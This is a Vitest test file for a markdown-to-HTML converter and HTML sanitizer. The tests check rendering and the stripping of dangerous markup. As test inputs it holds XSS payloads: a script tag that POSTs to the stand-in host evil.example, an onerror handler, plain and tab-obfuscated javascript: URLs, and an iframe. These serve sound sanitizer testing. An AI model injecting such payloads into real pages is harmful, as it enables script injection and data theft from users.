import { describe, it, expect } from 'vitest';
import { markdownToHtml, sanitizeHtml } from './mdToPdf';

describe('markdownToHtml', () => {
  it('renders headings, bold, and lists', () => {
    const html = markdownToHtml('# Title\n\n**bold** and a list:\n\n- one\n- two');
    expect(html).toContain('<h1>Title</h1>');
    expect(html).toContain('<strong>bold</strong>');
    expect(html).toContain('<li>one</li>');
  });

  it('strips script tags smuggled through markdown', () => {
    const html = markdownToHtml(
      '# Hi\n\n<script>fetch("https://evil.example", {method:"POST"})</script>',
    );
    expect(html).not.toContain('<script');
    expect(html).toContain('<h1>Hi</h1>');
  });
});

describe('sanitizeHtml', () => {
  it('drops event handler attributes', () => {
    expect(sanitizeHtml('<img src="x" onerror="alert(1)">')).not.toContain('onerror');
  });

  it('drops javascript: urls', () => {
    expect(sanitizeHtml('<a href="javascript:alert(1)">x</a>')).not.toContain('javascript:');
    expect(sanitizeHtml('<a href="java\tscript:alert(1)">x</a>')).not.toContain('script:');
  });

  it('drops iframes and forms', () => {
    const html = sanitizeHtml(
      '<iframe src="https://evil.example"></iframe><form action="/x"></form>',
    );
    expect(html).not.toContain('<iframe');
    expect(html).not.toContain('<form');
  });

  it('keeps ordinary links and images', () => {
    const html = sanitizeHtml('<a href="https://example.com">x</a><img src="/pic.png">');
    expect(html).toContain('href="https://example.com"');
    expect(html).toContain('src="/pic.png"');
  });
});
